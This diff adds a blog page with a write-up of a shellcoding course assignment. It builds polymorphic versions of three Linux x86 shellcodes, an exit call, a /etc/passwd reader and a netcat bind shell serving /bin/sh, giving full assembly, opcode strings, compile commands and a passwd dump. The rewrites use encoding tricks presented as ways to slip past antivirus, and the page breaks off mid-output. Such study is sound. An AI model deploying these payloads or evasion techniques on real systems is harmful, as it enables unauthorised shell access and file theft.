@@ -1,0 +1,1176 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>SLAE32 Assignment 6 - Polymorphic Shellcode | nibbles</title>
+<meta name="keywords" content="slae32">
+<meta name="description" content="This post introduces the 6th mission to my SLAE32 journey.
+If the previous assignment was cool, this one was even cooler because I could apply in the Msfvenom analysis assignment to develop polymorphic versions of existing shellcodes.
+There are some existing tools, such as ADMutate, that will XOR-encrypt existing shellcode and attach loader code to it. This is definitely useful, but writing polymorphic shellcode without a tool is a much better learning experience.">
+<meta name="author" content="nibbles">
+<link rel="canonical" href="https://0xnibbles.github.io/posts/slae_32_assignment_6/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.bccfefac377bc340f06c260aed1bddf49a4354816d7c570d6aac75a997986c95.css" integrity="sha256-vM/vrDd7w0DwbCYK7Rvd9JpDVIFtfFcNaqx1qZeYbJU=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://0xnibbles.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://0xnibbles.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://0xnibbles.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://0xnibbles.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://0xnibbles.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="SLAE32 Assignment 6 - Polymorphic Shellcode" />
+<meta property="og:description" content="This post introduces the 6th mission to my SLAE32 journey.
+If the previous assignment was cool, this one was even cooler because I could apply in the Msfvenom analysis assignment to develop polymorphic versions of existing shellcodes.
+There are some existing tools, such as ADMutate, that will XOR-encrypt existing shellcode and attach loader code to it. This is definitely useful, but writing polymorphic shellcode without a tool is a much better learning experience." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xnibbles.github.io/posts/slae_32_assignment_6/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-12-29T15:02:57+00:00" />
+<meta property="article:modified_time" content="2022-12-29T15:02:57+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SLAE32 Assignment 6 - Polymorphic Shellcode"/>
+<meta name="twitter:description" content="This post introduces the 6th mission to my SLAE32 journey.
+If the previous assignment was cool, this one was even cooler because I could apply in the Msfvenom analysis assignment to develop polymorphic versions of existing shellcodes.
+There are some existing tools, such as ADMutate, that will XOR-encrypt existing shellcode and attach loader code to it. This is definitely useful, but writing polymorphic shellcode without a tool is a much better learning experience."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://0xnibbles.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "SLAE32 Assignment 6 - Polymorphic Shellcode",
+      "item": "https://0xnibbles.github.io/posts/slae_32_assignment_6/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SLAE32 Assignment 6 - Polymorphic Shellcode",
+  "name": "SLAE32 Assignment 6 - Polymorphic Shellcode",
+  "description": "This post introduces the 6th mission to my SLAE32 journey.\nIf the previous assignment was cool, this one was even cooler because I could apply in the Msfvenom analysis assignment to develop polymorphic versions of existing shellcodes.\nThere are some existing tools, such as ADMutate, that will XOR-encrypt existing shellcode and attach loader code to it. This is definitely useful, but writing polymorphic shellcode without a tool is a much better learning experience.",
+  "keywords": [
+    "slae32"
+  ],
+  "articleBody": " This post introduces the 6th mission to my SLAE32 journey.\nIf the previous assignment was cool, this one was even cooler because I could apply in the Msfvenom analysis assignment to develop polymorphic versions of existing shellcodes.\nThere are some existing tools, such as ADMutate, that will XOR-encrypt existing shellcode and attach loader code to it. This is definitely useful, but writing polymorphic shellcode without a tool is a much better learning experience.\nIntroduction The SLAE32 6th assignment task is to select 3 shellcode payloads from shell-storm and create polymorphic versions of them without increasng the size of the shellcode by more than 50%;\nBonus points if we can make it shorter inlength compared to the original.\nShellcode 1 - sys_exit(0) This shellcode was written by gunslinger_, and is located here. This shellcode only calls exit() with 0 as exit code.\nSize: 8 bytes\n/* Name : 8 bytes sys_exit(0) x86 linux shellcode Date : may, 31 2010 Author : gunslinger_ Web : devilzc0de.com blog : gunslinger.devilzc0de.com tested on : linux debian */ char *bye= \"\\x31\\xc0\" /* xor %eax,%eax */ \"\\xb0\\x01\" /* mov $0x1,%al */ \"\\x31\\xdb\" /* xor %ebx,%ebx */ \"\\xcd\\x80\"; /* int $0x80 */ int main(void) { ((void (*)(void)) bye)(); return 0; } This is a short code, we have minimum alternatives to work with.\nglobal _start section .text _start: xor ebx, ebx ; clear ebx mul ebx ; using mul to clear eax and edx inc eax ; put exit(1) syscall in eax syscall Checking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/sys_exit(0)-shellcode-623/poly ‹main●› ╰─$ ../../../../assembler.sh 7-byte-poly_sys_exit.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 7 \"\\x31\\xdb\\xf7\\xe3\\x40\\x0f\\x05\" -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include #include unsigned char code[] = \\ \"\\x31\\xdb\\xf7\\xe3\\x40\\x0f\\x05\"; main() { printf(\"Shellcode Length: %d\\n\", strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it\n╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/sys_exit(0)-shellcode-623/poly ‹main●› ╰─$ gcc -fno-stack-protector -m32 -z execstack -o shellcode shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/sys_exit(0)-shellcode-623/poly ‹main●› ╰─$ ./shellcode Shellcode Length: 7 ╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/sys_exit(0)-shellcode-623/poly ‹main●› ╰─$ echo $? 0 Size: 7 bytes\nReduced 1 byte which is less 12,5% in size compared to the original.\nShellcode 2 - cat passwd Shellcode This shellcode was written by fb1h2s, and is located here. This shellcode will read the /etc/passwd file.\nSize: 43 bytes\n#include const char shellcode[]=\"\\x31\\xc0\" // xorl %eax,%eax \"\\x99\" // cdq \"\\x52\" // push edx \"\\x68\\x2f\\x63\\x61\\x74\" // push dword 0x7461632f \"\\x68\\x2f\\x62\\x69\\x6e\" // push dword 0x6e69622f \"\\x89\\xe3\" // mov ebx,esp \"\\x52\" // push edx \"\\x68\\x73\\x73\\x77\\x64\" // pu sh dword 0x64777373 \"\\x68\\x2f\\x2f\\x70\\x61\" // push dword 0x61702f2f \"\\x68\\x2f\\x65\\x74\\x63\" // push dword 0x6374652f \"\\x89\\xe1\" // mov ecx,esp \"\\xb0\\x0b\" // mov $0xb,%al \"\\x52\" // push edx \"\\x51\" // push ecx \"\\x53\" // push ebx \"\\x89\\xe1\" // mov ecx,esp \"\\xcd\\x80\" ; // int 80h int main() { (*(void (*)()) shellcode)(); return 0; } /* shellcode[]=\t\"\\x31\\xc0\\x99\\x52\\x68\\x2f\\x63\\x61\\x74\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x68\\x73\\x73\\x77\\x64\" \"\\x68\\x2f\\x2f\\x70\\x61\\x68\\x2f\\x65\\x74\\x63\\x89\\xe1\\xb0\\x0b\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80\"; */ We will use the assembly comment to know what the code is doing. Appears to use some tricks we have already using in past assignment, so we’ll just add junk instructions to change a bit the code.\nglobal _start section .text _start: mov eax, -1\t; put 0xfffff in eax inc eax\t; eax becomes zero cdq\t; zeroes edx lea ebx, [esp-0xc]\t; push edx push dword 0x7461632f ; tac/ push dword 0x6e69622f ; nib/ lea ecx, [ebx-0x10] ; use ebx as our \"stack pointer\" push edx push dword 0x64777374 ; dwst - changes a 's' for a 't' push dword 0x61702f2f ; ap// push dword 0x6374652f ; cte/ mov ax, 0x4a2f ; using AND operation because results in printable ASCII characters push edx xor byte [esp+0xc], 0x7\t; replacing 't' for a 's' push ecx push ebx mov ecx, esp and ax,0x358b ; becomeoxb - using AND operations to resulting in nulling part of eax without null bytes int 0x80 From the sbeginning of the code, edx in the end becomes zero. Some instructions below we changed one letter from /etc/passwd to /etcpatswd which we replace later the t with an s.\nThe most cooliest trick here is teh use of AND operations to zero eax. A real cool challenge because is an alternative to XOR operations. AND logic operations assemble into printable ASCII characters range (from 0x33 to 0x7e). ``XOR` logic operations doesn’t assemble into the printable ASCII range.\nSome buffers don’t allow unprintable characters. This way we can exploit what was previously unexploitable.\nLet’s using an example to show how it works\nASCII Printable Polymorphic Shellcode The AND logic table transforms bits as follows:\n1 and 1 = 1 0 and 0 = 0 1 and 0 = 0 0 and 1 = 0 Because the only case where the end result is a 1 is when both bits are 1, if two inverse values are ANDed onto EAX, EAX will become zero.\nBinary Hexadecimal 1000101010011100100111101001010 0x454e4f4a AND 0111010001100010011000000110101 AND 0x3a313035 ------------------------------------ --------------- 0000000000000000000000000000000 0x00000000 Using this technique two printable 32-bit values are also bitwise inverses of each other.\nWhat’s the advantage?\neax can be zeroed without using null bytes, and the outcome is assembled machine code will be printable text.\nFrom https://www.dmi.unipg.it/~bista/didattica/sicurezza-pg/buffer-overrun/hacking-book/0x2a0-writing_shellcode.html\nGetting back to our exercise, let’s use our code to demonstrate how we leverage this technique to our purpose.\nThe instructions used with this technique are:\nmov ax, 0x4a2f and ax, 0x358b The main goal is eax value becomes 0xb (execve syscall). So let’s see below why we used this values to perform the AND operation and the result of it.\nBinary Hexadecimal 0100 1010 0010 1111 0x4a2f AND 0011 0101 1000 1011 AND 0x358b ----------------------- ------------- 0000 0000 0000 1011 0x000b This too values are the inverse of each in the higher 8 bits, but in the low 8 bits they result in 0xb, the execve syscall.\nWill an antivirus or a human able to spot this by only looking at it?\nChecking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/cat_passwd-shellcode-571 ‹main●› ╰─$ ../../../assembler.sh cat_passwd.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 61 \"\\xb8\\xff\\xff\\xff\\xff\\x40\\x99\\x8d\\x5c\\x24\\xf4\\x52\\x68\\x2f\\x63\\x61\\x74\\x68\\x2f\\x62\\x69\\x6e\\x8d\\x4b\\xf0\\x52\\x68\\x74\\x73\\x77\\x64\\x68\\x2f\\x2f\\x70\\x61\\x68\\x2f\\x65\\x74\\x63\\x66\\xb8\\x2f\\x4a\\x52\\x80\\x74\\x24\\x0c\\x07\\x51\\x53\\x89\\xe1\\x66\\x25\\x8b\\x35\\xcd\\x80\" -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include #include unsigned char code[] = \\ \"\\xb8\\xff\\xff\\xff\\xff\\x40\\x99\\x8d\\x5c\\x24\\xf4\\x52\\x68\\x2f\\x63\\x61\\x74\\x68\\x2f\\x62\\x69\\x6e\\x8d\\x4b\\xf0\\x52\\x68\\x74\\x73\\x77\\x64\\x68\\x2f\\x2f\\x70\\x61\\x68\\x2f\\x65\\x74\\x63\\x66\\xb8\\x2f\\x4a\\x52\\x80\\x74\\x24\\x0c\\x07\\x51\\x53\\x89\\xe1\\x66\\x25\\x8b\\x35\\xcd\\x80\"; main() { printf(\"Shellcode Length: %d\\n\", strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it\n╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/cat_passwd-shellcode-571 ‹main●› ╰─$ gcc -fno-stack-protector -m32 -z execstack -o shellcode shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/cat_passwd-shellcode-571 ‹main●› ╰─$ ./shellcode Shellcode Length: 61 root:x:0:0:root:/root:/usr/bin/zsh daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin dnsmasq:x:105:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:107:113:RealtimeKit,,,:/proc:/usr/sbin/nologin pulse:x:108:117:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin speech-dispatcher:x:109:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false avahi:x:110:119:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin saned:x:111:120::/var/lib/saned:/usr/sbin/nologin colord:x:112:121:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false lightdm:x:114:122:Light Display Manager:/var/lib/lightdm:/bin/false systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin edu:x:1000:1000:edu:/home/edu:/usr/bin/zsh Size: 61 bytes\nIncreased 41,9% which reflects in more 17 bytes.\nShellcode 3 - nc -lvve/bin/sh -p13377 Sharing some thoughts This was by far the most challenging exercise I had during the course\nAt some point I turn it into a personal thing because I was decided to put the techniques I learned from the msfvenom shellcode analysis assignment into this exercise and nothing seems to not working at all.\nOne constraint that I need to bypass was the fact that I generated the msfvenoom shellcodes with null bytes.\nThis time I couldn’t use null bytes and that’s why I needed to review how msfvenom generates shellcode without null-bytes and tried to apply that methodology into this task.\nThis way I will present two polymorphic versions of this shellcode: one shellcode with null bytes and other null-free shellcode.\nThen, we can compare the differences between them and reflect how hard is to develop a null-free shellcode.\nThe following quote tells the mindset we should have to not give up when we face a complex problem and resumes how difficult it was for me to make it working.\nIntelligence is the ability to adapt to change, by Stephen Hawking After this, let’s get to the point.\nThis shellcode was written by an Anonymous user, and is located here. As the shellcode description says, this shellcode will listen on port 13377 using netcat and give /bin/sh to connecting attacker.\nThe original shellcode does not have any comments, so I added some to be easier to understabds its internals.\nSize: 62 bytes\nlinux x86 nc -lvve/bin/sh -p13377 shellcode This shellcode will listen on port 13377 using netcat and give /bin/sh to connecting attacker Author: Anonymous Site: http://chaossecurity.wordpress.com/ Here is code written in NASM ///////////////////////////// section .text global _start _start: xor eax,eax xor edx,edx push 0x37373333\t; 7733 push 0x3170762d\t; 1pv- mov edx, esp push eax push 0x68732f6e\t; hs/n push 0x69622f65\t; ib/e push 0x76766c2d\t; vvl- mov ecx,esp push eax push 0x636e2f2f\t; cn// push 0x2f2f2f2f\t; //// push 0x6e69622f\t; nib/ mov ebx, esp push eax push edx push ecx push ebx xor edx,edx mov ecx,esp mov al,11\t; execve syscall int 0x80 ////////////////////////////////// And here is objdump from which you can see the shellcode ////////////////////////////////// teo@teo-desktop ~ $ objdump -d a.out a.out: file format elf32-i386 Disassembly of section .text: 08048060 \u003c.text\u003e: 8048060: 31 c0 xor %eax,%eax 8048062: 31 d2 xor %edx,%edx 8048064: 68 33 33 37 37 push $0x37373333 8048069: 68 2d 76 70 31 push $0x3170762d 804806e: 89 e2 mov %esp,%edx 8048070: 50 push %eax 8048071: 68 6e 2f 73 68 push $0x68732f6e 8048076: 68 65 2f 62 69 push $0x69622f65 804807b: 68 2d 6c 76 76 push $0x76766c2d 8048080: 89 e1 mov %esp,%ecx 8048082: 50 push %eax 8048083: 68 2f 2f 6e 63 push $0x636e2f2f 8048088: 68 2f 2f 2f 2f push $0x2f2f2f2f 804808d: 68 2f 62 69 6e push $0x6e69622f 8048092: 89 e3 mov %esp,%ebx 8048094: 50 push %eax 8048095: 52 push %edx 8048096: 51 push %ecx 8048097: 53 push %ebx 8048098: 31 d2 xor %edx,%edx 804809a: 89 e1 mov %esp,%ecx 804809c: b0 0b mov $0xb,%al 804809e: cd 80 int $0x80 I said above for this exercise I had completely different approach than others.\nThe inspiration was the methodology used by the previous analyzed msfvenom shellcodes.\nI will present first the shellcode with null bytes.\nNull Byte Shellcode xor eax, eax cdq call $+ 0xf sub eax,0x33317076 xor esi,DWORD [edi] aaa add byte [eax], al pop edx call $ + 0x13 sub eax,0x6576766c das bound ebp, [ecx+0x6e] das jae $+0x6a add byte [eax], al pop ecx call $ + 0x12 das bound ebp, [ecx+0x6e] das das das das das das outsb arpl word [eax],ax pop ebx push eax push edx push ecx push ebx mov eax, 0x454e4a2f ;add ax, 0x1000 xor edx,edx mov ecx,esp and eax,0x3a31358b int 0x80 Let’s divide and conquer one more time.\nThe code is divided in parts related to each argument of the command to executed by execve.\nEach part is delimited by a call and a pop instruction. The isntruction inside this part are used to prepare an argument. The pop $Register instruction is used to put the address pointer of the argument from esp to the related register depending on each argument position of execve we are dealing.\n4th argument - pop edx 3rd argument - pop ecx 2nd argument - pop ebx 1st argument - pop eax So the pop instruction will tell us what execve argument we were preparing of. The same process used to execute any syscall but with obfuscated code.\nFor example:\nxor eax, eax cdq call $+ 0xf\t; Start sub eax,0x33317076 xor esi,DWORD [edi] aaa add byte [eax], al pop edx\t; end call $+0xf tells us we are looking to a “piece” of code that is preparing the 4th argument because, the end of this part is pop edx.\nBetween these instruction it seems that we have assembly instruction that doesn’t make any sense that will be executed by the CPU but, this is not the case.\nBy this time, you should be familiar with the x86 calling conventions and how call instruction behaves.\nJust a reminder, the call instruction pushes the return address (address immediately after the call instruction) on the stack and it changes eip to the call destination. This effectively transfers control to the call target and begins execution there.\nSo what are these instructions doing exactly? xor eax, eax ; zeroes eax cdq ; zeroes edx (saves space) call $ + 0xf\t; jumps to pop ebx sub eax,0x33317076 xor esi,DWORD [edi] aaa add byte [eax], al pop edx ; saving execve 4th argument\tFirstly, we are clearing eax and edx registers, the we use call to save next isntruction address and jump to the pop ebx instruction.\nWhy $ + 0xf?\nWell, the $ holds the address of the current instruction. As an example, let’s use the above code and compare the disassembled output with objdump -M intel -d netcat_nullbyte_shellcode\nxor eax, eax cdq call $+ 0xf ; $ holds address of call opcode sub eax,0x33317076 xor esi,DWORD [edi] aaa add byte [eax], al pop edx --- 08049000 \u003c_start\u003e: 8049000: 31 c0 xor eax,eax 8049002: 99 cdq 8049003: e8 0a 00 00 00 call 8049012 \u003c_start+0x12\u003e 8049008: 2d 76 70 31 33 sub eax,0x33317076 804900d: 33 37 xor esi,DWORD PTR [edi] 804900f: 37 aaa 8049010: 00 00 add BYTE PTR [eax],al 8049012: 5a pop edx Checking the opcodes (2nd column) there is as distance of 15 bytes between pop edx and the call instruction.\nLook how the call instruction introduces null bytes when used when redirects execution with an instruction with a short distance.\nSo, we are storing the same bytes in edx as the original shellcode does. Instead of doing push instructions and put the bytes on the stack\nApproach 1\n; Not forget these are placed in Little-Endian format push 0x37373333 push 0x3170762d Approach 2\nWe place the exact same bytes as opcodes in the code and put the address of the first byte in edx\n2d 76 70 31 33 sub eax,0x33317076 33 77 04 xor esi,DWORD PTR [edi+0x4] 37 aaa 00 40 01 add BYTE PTR [eax+0x1],al Hex bytes: **0x2D, 0x76, 0x70, 0x31, 0x33, 0x33, 0x77, 0x04, 0x37**, 0x00 Comparing both approaches we see they have the same exact bytes. We can check this with gdb\nThe approach 2 has the disadvantage to put null bytes because we need to specify the end of them while with approach 1 we just push a zeroed register which does have null bytes.\nThis is the main reason I struggled with Approach 2 and why I need to rethink and completely change my approach to avoid null bytes.\nNull Byte Free Shellcode xor eax,eax mov al, 0x8 fnop jmp short argParser sub eax,0x33317076 xor esi,DWORD [edi] aaa nop ; nops will be changed to nulls in runtime lea edx, [esi+4] mov al, 0xc fnop jmp short argParser sub eax,0x6576766c ; \\xe8\\x0e\\x00\\x00\\x00 das bound ebp, [ecx+0x6e] das jae $+0x6a nop lea ecx, [esi+4] ;call $ + 0x12 ;\\xe8\\x0d\\x00\\x00\\x00 mov al, 0xc fnop jmp short argParser das bound ebp, [ecx+0x6e] das das das das das das outsb arpl word [eax],bx lea ebx, [esi+4] push eax push edx push ecx push ebx cdq ; clear edx because is one of execve's arguments --\u003e char *const envp[] mov ecx,esp mov al, 0xb int 0x80 argParser: ; similar to jmp-call-pop but calls to a nop byte which can ; assmuming al has the right distance fnstenv [esp-0xc] pop esi mov byte [esi + 0x4 + eax], ah ; null-byte decoder lea edi, [esi + 0x4+eax+0x1] xor eax,eax jmp edi The approach idea is the same as the Approach 2 from the Null Byte shellcode, but this uses the fnstenv technique from the x87 FPU to store the FPU related instruction address instead of using call. This technique was mentioned during the course but it involved to research on our own to understand how we can use it.\nTo put the shellcode working with this technique, the logic needed to be completely redesigned.\nThe FNSTENV Technique There are alternative methods in shellcode for finding the value of the EIP register using instructions that contain no null bytes. One of those methods uses an FPU instruction.\nBelow the image from FPU section in Intel’s manual, shows how the FPU memory organization.\nWhen FSTENV instruction is preceded by some other FPU instruction (in our case, it is fnop), then the result of the fnstenv is pushed on to the stack, and the result is none other than the address of the previous FPU instruction.\nFor this exercise I used fnop instruction. It can fldz or other FPU related isntruction to use this technique. just make sure to be an FPU isntruction.\nPoC code with fnstenv\nl1: fnop fnstenv [esp-0c] ; FPU Instruction Pointer (FIP) pop eax l2: ... The result of the above two FPU instructions will be the address of fnop instruction gets saved on to the stack.\nWhen l2 is reached, the value in the eax register will be the address of l1.\nDebugging fnstenv Debugging the code with the fnstenv technique was a complete madness to my head.\nI figured out that performing single-stepping debugging over the fnop instruction results in a completely different value in the eax register. This means that the code could be altered in a very subtle way.\nSo, the solution was place a breakpoint in fnop and the instruction after the fnstenv. In our code is pop esi\nmov al, 0x8 fnop ; breakpoint here jmp short argParser [...] argParser: fnstenv [esp-0xc] pop esi ; breakpoint here mov byte [esi + 0x4 + eax], ah lea edi, [esi + 0x4+eax+0x1] xor eax,eax jmp edi Between these instructions I executed the program normally to avoid the unstable behaviour fnstenv causes when performing single-step debugging.\nDebug section taken from VirtualPC-specific section in https://www.virusbulletin.com/virusbulletin/2010/11/anti-unpacker-tricks-part-fourteen\nMethodology As well as the previous shellcode, the code is divided in parts related to each argument of the command to executed by execve.\nThis time, each part is delimited by a mov, fnop, jmp and a lea instructions. The instructions inside this part are used to prepare one of the execve’s arguments.\nThe mov, fnop, jmp instructions prepare the environment to store EIP address and to store the bytes in the related register to the execve argument.\nThe lea $REGISTER, [esi+4] instruction is used to put the address pointer of the argument from esp to the related register depending on each argument position of execve we are dealing.\nSo the lea instruction will tell us what execve argument we were preparing of.\nLet’s take a the “piece” of code for one of the arguments from our shellcode and dig into it.\nWe’ll be analyzing what we put in the edx register.\n; start of edx section argument mov al, 0x8 ; distance from sub to nop fnop ; FPU instruction used to store instruction pointer in FPU stack jmp short argParser sub eax,0x33317076 xor esi,DWORD [edi] aaa nop ; avoid null byte. changed in runtime to null lea edx, [esi+4] ; end of edx section argument ;---------------------------------------- ; starting preparing next argument mov al, 0xc [...] argParser: fnstenv [esp-0xc] ; Storing fnop address onto the stack pop esi ; put stored FIP address in esi mov byte [esi + 0x4 + eax], ah ; null-byte decoder --\u003e change nop to null lea edi, [esi + 0x4+eax+0x1] ; load the address of lea edx, [esi+4] instruction xor eax,eax ; zeroed eax before executing next argument section jmp edi ; jump to instruction lea edx, [esi+4] First, we move to al the distance from the first byte of the argument to be placed in edx to the nop isntruction. We don’t consider fnop and jmp opcodes because this are always equal across every argument section, so they considered in the ArgParser branch.\nWe can use objdump to verify that the distance between sub eax,0x33317076 and nop is 8 bytes.\n8049004: d9 d0 fnop 8049006: eb 43 jmp 804904b 8049008: 2d 76 70 31 33 sub eax,0x33317076 804900d: 33 37 xor esi,DWORD PTR [edi] 804900f: 37 aaa 8049010: 90 nop 0x8049010 - 0x8049008 = 0x8 bytes Then, we execute an FPU instruction to store the fnop address in the FPU stack. This address will be the reference to our further actions. Next, we jump to the ArgParser branch.\nmov al, 0x8 ; distance from sub to nop fnop ; FPU instruction used to store instruction pointer in FPU stack jmp short argParser In this branch is where all the magic happens.\nargParser: fnstenv [esp-0xc] ; Storing fnop address onto the stack pop esi ; put stored FIP address in esi mov byte [esi + 0x4 + eax], ah ; null-byte decoder --\u003e change nop to null lea edi, [esi + 0x4+eax+0x1] ; load the address of lea edx, [esi+4] instruction xor eax,eax ; zeroed eax before executing next argument section jmp edi ; jump to instruction lea edx, [esi+4] First we store the fnop address on the stack and put that address in esi register.\nThen, remember that nop (0x90) byte we put in the end of the section argument?\nWe need to put a null byte in the end but we can’t put it explicitly. So we are going to change it to null byte with the following single instruction\nmov byte [esi + 0x4 + eax], ah ; ah is always zero Basically we are moving the higher bytes ax register to the address of the nop byte. We know that ah is always because in the beginning of the shellcode we have xor eax, eax and in the ArgParser branch and we just work with al in each argument section. So, ah byte is not touched during our operations.\nThis way a null byte is placed in the of the argument bytes marking the end of the string bytes.\nLet’s demonstrate it in gdb\nAfter changing 0x90 to 0x00. three new instructions appeared.\nThat null-byte changed also the fnstenv instruction. What a simple thing can do, right?\nAfter performing this operation we need to store the argument address in edx. Basically we need to jump to the lea edx, [esi+4] instruction.\nThe way our code is doing is by load to edi the lea address based on the esi register which holds the fnop instruction address, adding the distance from fnop to esi which was the former nop byte and adding 1 more byte to reach lea edx, [esi+4] from the fnop instruction.\nlea edi, [esi + 0x4+eax+0x1] ; load the address of lea edx, [esi+4] instruction The most tricky is done, we just need to clear eax to prepare the next argument section and jump to put argument address in edx using edi.\nxor eax,eax ; zeroed eax before executing next argument section jmp edi ; jump to instruction lea edx, [esi+4] Then, it is just doing the same for the other arguments.\nWe end our shellcode calling execve with usual process.\npush eax ; 0x0 push edx ; -vp13377 push ecx ; -lvve/bin/sh push ebx ; /bin//////nc cdq ; clear edx because is one of execve's arguments --\u003e char *const envp[] mov ecx,esp mov al, 0xb ; execve syscall int 0x80 hecking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/netcat-shellcode-804/poly ‹main●› ╰─$ ../../../../assembler.sh poly_netcat.nasm 150 ↵ [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 92 \"\\x31\\xc0\\xb0\\x08\\xd9\\xd0\\xeb\\x43\\x2d\\x76\\x70\\x31\\x33\\x33\\x37\\x37\\x90\\x8d\\x56\\x04\\xb0\\x0c\\xd9\\xd0\\xeb\\x31\\x2d\\x6c\\x76\\x76\\x65\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x90\\x8d\\x4e\\x04\\xb0\\x0c\\xd9\\xd0\\xeb\\x1b\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x2f\\x2f\\x2f\\x2f\\x6e\\x63\\x18\\x8d\\x5e\\x04\\x50\\x52\\x51\\x53\\x99\\x89\\xe1\\xb0\\x0b\\xcd\\x80\\xd9\\x74\\x24\\xf4\\x5e\\x88\\x64\\x06\\x04\\x8d\\x7c\\x30\\x05\\x31\\xc0\\xff\\xe7\" -------------------- [*] 